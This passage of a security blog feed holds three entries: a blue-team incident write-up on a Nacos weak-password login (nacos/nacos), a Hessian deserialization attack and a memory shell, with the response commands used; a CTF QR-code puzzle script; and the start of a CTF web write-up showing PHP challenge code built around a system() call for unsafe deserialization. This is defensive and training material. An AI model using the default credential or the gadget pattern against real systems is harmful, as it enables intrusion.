&lt;p&gt;升级 velocity 组件版本，对漏洞进行修复，或者通过 WAF 添加临时防护规则对漏洞进行防护。漏洞未修复前或未得到有效的防护前建议不要对互联网开放该应用。&lt;/p&gt;
&lt;h1 id=&#34;nacos弱口令nacos-jraft-hessian反序列化攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nacos弱口令nacos-jraft-hessian反序列化攻击&#34;&gt;#&lt;/a&gt; Nacos 弱口令＋Nacos Jraft Hessian 反序列化攻击&lt;/h1&gt;
&lt;h2 id=&#34;攻击发现微步tdp-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击发现微步tdp-4&#34;&gt;#&lt;/a&gt; 攻击发现（微步 TDP）&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/19 01:33:16&lt;/p&gt;
&lt;p&gt;nacos 弱口令登陆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C39.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;弱口令：nacos/nacos&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/19 02:09:45&lt;/p&gt;
&lt;p&gt;Nacos Jraft Hessian 反序列化攻击&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C40.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间：2023/08/19 02:11:43 - 2023/08/19 02:30:35&lt;/p&gt;
&lt;p&gt;哥斯拉内存马通信&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;D:%5Chexo-blog%5Csource_posts%5C%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E8%93%9D%E9%98%9F%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5%E4%BB%A5%E5%8F%8A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5C41.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击分析排查应急响应&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击分析排查应急响应&#34;&gt;#&lt;/a&gt; 攻击分析排查 / 应急响应&lt;/h2&gt;
&lt;p&gt;登录受害主机，识别可疑进程为 file:// Content 已删除进程。系统日志，仅保留到 22 年，无最新日志。&lt;br&gt;
访问 nacos 业务系统，看到平台存在一些可执行配置文件，协调同事排查哪些属于正常业务系统的配置文件，确认完成后，清除可疑文件，另外协同事，部署终端主机查杀，做一次安全巡检。当前主机为断网隔离状态。&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
&lt;h2 id=&#34;准备阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备阶段&#34;&gt;#&lt;/a&gt; 准备阶段&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;系统内自查，尽可能消除弱口令，做好宣传动员，提升防守意识，防止钓鱼&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;部署安全设备，如态势感知（微步 TDP / 深信服 SIP / 奇安信 NGSOC 等等），防火墙（新华三防火墙 / 迪普防火墙），waf（长亭雷池），蜜罐（长亭谛听 / 默安幻阵 / 观安蜜网），堡垒机（安恒明御），全流量分析（科来全流量安全分析系统），负载均衡（新华三负载均衡），主机防护（青藤万相）......&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;先使用漏洞扫描系统（绿盟漏扫）对资产进行一次全面扫描自查&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击发现阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击发现阶段&#34;&gt;#&lt;/a&gt; 攻击发现阶段&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过态势感知产品（微步 TDP / 深信服 SIP / 奇安信 NGSOC 等等）的告警发现攻击（大部分的入侵点为弱口令以及 nday）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分析告警信息以及流量包，确认攻击是否成功，攻击阶段是否已经入侵内网 / 是否已经扩散，攻击者是否上传 webshell 或内存马等等（看攻击 IP、受害 IP 是否内网 IP，若是，则可能内网失陷；看响应码是否为 200，响应内容与请求内容是否相应，若相应，则可能攻击成功）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击分析排查应急响应阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击分析排查应急响应阶段&#34;&gt;#&lt;/a&gt; 攻击分析排查 / 应急响应阶段&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;封禁攻击 IP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;受害主机进行断网隔离&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上机排查&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;查看 web 日志，分析攻击者主要进行了什么活动（是否上传 webshell / 是否存在内存马）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;若有 webshell，找出 webshell 上传接口，上传路径，webshell 文件名&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;确认 webshell 位置，清理木马文件以及其他可疑文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZDk5bmV0Lm5ldC8=&#34;&gt;D 盾防火墙&lt;/span&gt;查杀&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看代码，及时修复上传漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;若有内存马，使用工具（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2phdmEtbWVtc2hlbGwtc2Nhbm5lcg==&#34;&gt;java-memshell-scanner&lt;/span&gt;/&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L2NvcGFnZW50&#34;&gt;copagent&lt;/span&gt;/&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzRyYTFuL3NoZWxsLWFuYWx5emVy&#34;&gt;shell-analyzer&lt;/span&gt;）查杀&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;识别可疑进程，终止进程（Windows：tasklist /svc；Linux：top、ps、pstree）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;直接重启服务（在确认不影响客户正常业务，征得客户同意后）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 Tmp 目录，是否存在可疑文件，及时清理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看分析安全日志，攻击者是否登陆 administrator 用户 / 添加新用户&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;net user 查看是否添加异常用户&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;crontab -l 查看是否存在异常定时任务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;部署主机防护系统（青藤万相）查杀，进行安全巡检&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;给出修复建议 / 修复漏洞，重新上线服务&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;一些应急响应过程中需要用到的命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一些应急响应过程中需要用到的命令&#34;&gt;#&lt;/a&gt; 一些应急响应过程中需要用到的命令&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Windows 安全日志位于事件查看器 / Windows 日志 / 安全（Windows id 时间响应码）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;4624 登录成功&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;4625 登录失败&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;4672 使用超级管理员进行登录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;4720 创建用户&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看用户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Windows：net uer&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux：cat /etc/passwd（文件后面第二个冒号的值大于 1000 时，这个就是一个用户）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看进程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Windows：tasklist /svc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux：top、ps、pstree&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看定时任务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Windows：taskschd.msc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux：crontab -l&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结束阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结束阶段&#34;&gt;#&lt;/a&gt; 结束阶段&lt;/h2&gt;
&lt;p&gt;出具网络安全攻防演习项目总结报告&lt;/p&gt;
</content>
        <category term="攻防演练" scheme="https://c2young.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" />
        <category term="蓝队" scheme="https://c2young.github.io/tags/%E8%93%9D%E9%98%9F/" />
        <category term="应急响应" scheme="https://c2young.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" />
        <category term="攻击排查" scheme="https://c2young.github.io/tags/%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5/" />
        <updated>2024-01-17T08:01:49.000Z</updated>
    </entry>
    <entry>
        <id>https://c2young.github.io/2023/11/15/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-misc-%E5%9B%BD%E9%99%85%E8%B1%A1%E6%A3%8B%E4%B8%8E%E4%BA%8C%E7%BB%B4%E7%A0%81/</id>
        <title>2023强网拟态-misc-国际象棋与二维码</title>
        <link rel="alternate" href="https://c2young.github.io/2023/11/15/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-misc-%E5%9B%BD%E9%99%85%E8%B1%A1%E6%A3%8B%E4%B8%8E%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
        <content type="html">&lt;h1 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; misc&lt;/h1&gt;
&lt;h2 id=&#34;国际象棋与二维码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#国际象棋与二维码&#34;&gt;#&lt;/a&gt; 国际象棋与二维码&lt;/h2&gt;
&lt;p&gt;开局一张图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt=&#34;image-20231115160551063&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过观察图片的三个角形状相似，应该是对应二维码的三个定位点，结合题目提示，写脚本把图片与国际象棋棋盘进行异或&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pic = Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;attach.png&amp;quot;&lt;/span&gt;).convert(&lt;span class=&#34;string&#34;&gt;&amp;quot;L&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#fin = []&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                c = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; pic.getpixel((i*(&lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;)+(&lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, j*(&lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;)+(&lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;49&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) &amp;lt; &lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;//&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;# print(i, j, c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                key ^= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                x += &lt;span class=&#34;string&#34;&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; c^key == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;_&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(x)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;获得一个二维码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt=&#34;image-20231115160741331&#34;&gt;&lt;/p&gt;
&lt;p&gt;扫码得到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;3.png&#34; alt=&#34;image-20231115161103010&#34;&gt;&lt;/p&gt;
</content>
        <category term="ctf-misc" scheme="https://c2young.github.io/tags/ctf-misc/" />
        <updated>2023-11-15T08:02:39.000Z</updated>
    </entry>
    <entry>
        <id>https://c2young.github.io/2023/11/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
        <title>2023鹏城杯初赛</title>
        <link rel="alternate" href="https://c2young.github.io/2023/11/15/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
        <content type="html">&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; web&lt;/h1&gt;
&lt;h2 id=&#34;web-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-1&#34;&gt;#&lt;/a&gt; web 1&lt;/h2&gt;
&lt;p&gt;源码如下&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Hacker&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$exp&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt;  &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;cat /flag&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;A&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span 